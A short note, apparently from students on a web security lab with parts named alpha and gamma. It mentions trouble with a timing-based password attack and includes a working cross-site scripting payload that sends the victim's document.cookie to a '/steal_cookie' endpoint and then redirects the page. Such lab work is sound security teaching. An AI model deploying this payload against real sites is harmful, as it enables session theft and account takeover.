Everything works except we're having issues with gamma -- the correct password takes the most time most of the time but we haven't been able to figure out how to make it work every time.

Some helper code below:

Script used to make url for alpha:
<script>
var req = new XMLHttpRequest();
req.open("GET", "http://localhost:3000/steal_cookie?cookie="+document.cookie);
req.onload = function () {
    console.log(req.response);
    window.location.replace("http://localhost:3000/profile?username=user1");
};
req.send();
</script>
